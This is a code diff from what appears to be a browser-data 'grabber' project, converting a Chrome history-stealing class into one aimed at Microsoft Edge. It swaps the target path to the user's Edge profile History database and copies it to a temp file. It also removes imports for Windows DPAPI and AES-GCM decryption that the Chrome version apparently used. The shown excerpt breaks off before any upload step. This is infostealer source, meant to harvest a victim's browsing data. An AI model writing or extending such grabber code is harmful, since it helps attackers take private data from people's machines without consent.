@@ -1,28 +1,22 @@
-package ninja.maki.grabber.chrome;
+package ninja.maki.grabber.edge;
 
-import com.sun.jna.platform.win32.Crypt32Util;
 import ninja.maki.utils.SystemUtil;
-import org.apache.commons.codec.binary.Base64;
 
-import javax.crypto.Cipher;
-import javax.crypto.spec.GCMParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
-import java.io.*;
-import java.nio.charset.StandardCharsets;
+import java.io.File;
+import java.io.IOException;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.ResultSet;
 import java.sql.Statement;
-import java.util.Arrays;
 
-public class ChromeHistory {
+public class EdgeHistory {
     public static void grab() {
         SystemUtil.console();
-        String historyTemp = System.getProperty("java.io.tmpdir") + "chromehistory.tmp";
-        String historyPath = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";
+        String historyTemp = System.getProperty("java.io.tmpdir") + "edgehistory.tmp";
+        String historyPath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History";
         File historyTempFile = new File(historyTemp);
         try {
-            historyTempFile = File.createTempFile("chromehistory", ".tmp");
+            historyTempFile = File.createTempFile("edgehistory", ".tmp");
             historyTemp = historyTempFile.getAbsolutePath();
         }catch (IOException e){
             SystemUtil.console("Failed to create temp file.");
